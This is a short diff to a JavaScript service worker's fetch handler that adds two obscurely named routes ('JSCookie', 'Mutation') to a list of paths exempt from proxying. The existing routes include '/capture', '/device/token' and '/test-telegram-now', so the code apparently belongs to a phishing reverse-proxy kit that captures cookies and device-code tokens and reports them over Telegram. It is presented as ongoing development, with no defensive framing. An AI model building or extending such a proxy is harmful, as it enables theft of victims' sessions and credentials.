@@ -4,14 +4,16 @@ self.addEventListener("fetch", (event) => {
 
     // Bypass internal routes – do NOT proxy these
     const bypassPaths = [
-        '/capture',
-        '/device/request',
-        '/device/token',
-        '/test-telegram-now',
-        '/health',
-        '/favicon.ico',
-        '/service_worker_Mz8XO2ny1Pg5.js'
-    ];
+    '/capture',
+    '/device/request',
+    '/device/token',
+    '/test-telegram-now',
+    '/health',
+    '/favicon.ico',
+    '/service_worker_Mz8XO2ny1Pg5.js',
+    '/JSCookie_6X7dRqLg90mH',   // ← important!
+    '/Mutation_o5y3f4O7jMGW'    // ← important!
+];
     if (bypassPaths.some(path => url.pathname === path)) {
         event.respondWith(fetch(event.request));
         return;
